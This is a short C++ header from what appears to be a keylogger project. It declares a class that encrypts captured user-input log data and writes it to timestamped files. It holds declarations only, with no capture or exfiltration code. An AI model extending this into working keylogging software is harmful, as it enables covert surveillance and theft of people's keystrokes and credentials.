#pragma once

#include "FileSystemAccess.h"
#include "Encryptor.h"
#include <memory>

namespace keylogger
{
class UserInputFileLogger
{
    UserInputFileLogger(std::shared_ptr<FileSystemAccess>, std::unique_ptr<Encryptor>);

    std::string writeLogToNewlyCreatedFileBasedOnCurrentTime(const std::string& logData);

private:
    std::shared_ptr<FileSystemAccess> fileSystemAccess;
    std::unique_ptr<Encryptor> encryptor;
};
}